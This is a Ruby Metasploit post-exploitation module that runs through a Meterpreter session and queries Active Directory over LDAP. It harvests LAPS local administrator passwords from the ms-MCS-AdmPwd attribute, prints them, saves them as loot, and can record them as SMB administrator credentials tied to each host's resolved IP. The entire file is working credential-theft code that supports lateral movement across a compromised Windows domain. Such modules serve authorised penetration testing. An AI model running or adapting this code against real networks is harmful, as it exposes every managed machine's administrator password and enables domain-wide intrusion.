##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  FIELDS = ['distinguishedName',
            'dNSHostName',
            'ms-MCS-AdmPwd',
            'ms-MCS-AdmPwdExpirationTime'].freeze

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Windows Gather Credentials Local Administrator Password Solution',
      'Description'  => %Q{
        This module will recover the LAPS (Local Administrator Password Solution) passwords,
        configured in Active Directory, which is usually only accessible by privileged users.
        Note that the local administrator account name is not stored in Active Directory,
        so it is assumed to be 'Administrator' by default.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Ben Campbell',
        ],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
    ))

    register_options([
      OptString.new('LOCAL_ADMIN_NAME', [true, 'The username to store the password against', 'Administrator']),
      OptBool.new('STORE_DB', [true, 'Store file in loot.', false]),
      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),
      OptString.new('FILTER', [true, 'Search filter.', '(&(objectCategory=Computer)(ms-MCS-AdmPwd=*))'])
    ])

    deregister_options('FIELDS')
  end

  def run
    search_filter = datastore['FILTER']
    max_search = datastore['MAX_SEARCH']

    begin
      q = query(search_filter, max_search, FIELDS)
    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
      print_error(e.message)
      return
    end

    if q.nil? || q[:results].empty?
      print_status('No results returned.')
    else
      print_status('Parsing results...')
      results_table = parse_results(q[:results])
      print_line results_table.to_s

      if datastore['STORE_LOOT']
        stored_path = store_loot('laps.passwords', 'text/plain', session, results_table.to_csv)
        print_good("Results saved to: #{stored_path}")
      end
    end
  end

  # Takes the results of LDAP query, parses them into a table
  # and records and usernames as {Metasploit::Credential::Core}s in
  # the database if datastore option STORE_DB is true.
  #
  # @param [Array<Array<Hash>>] the LDAP query results to parse
  # @return [Rex::Text::Table] the table containing all the result data
  def parse_results(results)
    laps_results = []
    # Results table holds raw string data
    results_table = Rex::Text::Table.new(
      'Header'     => 'Local Administrator Password Solution (LAPS) Results',
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => FIELDS
    )

    results.each do |result|
      row = []

      result.each do |field|
        if field.nil?
          row << ""
        else
          if field[:type] == :number
            value = convert_windows_nt_time_format(field[:value])
          else
            value = field[:value]
          end
          row << value
        end
      end

      hostname = result[FIELDS.index('dNSHostName')][:value].downcase
      password = result[FIELDS.index('ms-MCS-AdmPwd')][:value]
      dn = result[FIELDS.index('distinguishedName')][:value]
      expiration = convert_windows_nt_time_format(result[FIELDS.index('ms-MCS-AdmPwdExpirationTime')][:value])

      unless password.to_s.empty?
        results_table << row
        laps_results << { hostname: hostname,
                          password: password,
                          dn: dn,
                          expiration: expiration
        }
      end
    end

    if datastore['STORE_DB']
      print_status('Resolving IP addresses...')
      hosts = []
      laps_results.each do |h|
        hosts << h[:hostname]
      end

      resolve_results = client.net.resolve.resolve_hosts(hosts)

      # Match each IP to a host...
      resolve_results.each do |r|
        l = laps_results.find{ |laps| laps[:hostname] == r[:hostname] }
        l[:ip] = r[:ip]
      end

      laps_results.each do |r|
        next if r[:ip].to_s.empty?
        next if r[:password].to_s.empty?
        store_creds(datastore['LOCAL_ADMIN_NAME'], r[:password], r[:ip])
      end
    end

    results_table
  end


  def store_creds(username, password, ip)
    service_data = {
      address: ip,
      port: 445,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      username: username,
      private_data: password,
      private_type: :password
    }

    credential_data.merge!(service_data)

    # Create the Metasploit::Credential::Core object
    credential_core = create_credential(credential_data)

    # Assemble the options hash for creating the Metasploit::Credential::Login object
    login_data = {
      core: credential_core,
      access_level: 'Administrator',
      status: Metasploit::Model::Login::Status::UNTRIED
    }

    # Merge in the service data and create our Login
    login_data.merge!(service_data)
    create_credential_login(login_data)
  end

  # https://gist.github.com/nowhereman/189111
  def convert_windows_nt_time_format(windows_time)
    unix_time = windows_time.to_i/10000000-11644473600
    ruby_time = Time.at(unix_time)
    ruby_time.strftime("%d/%m/%Y %H:%M:%S GMT %z")
  end
end
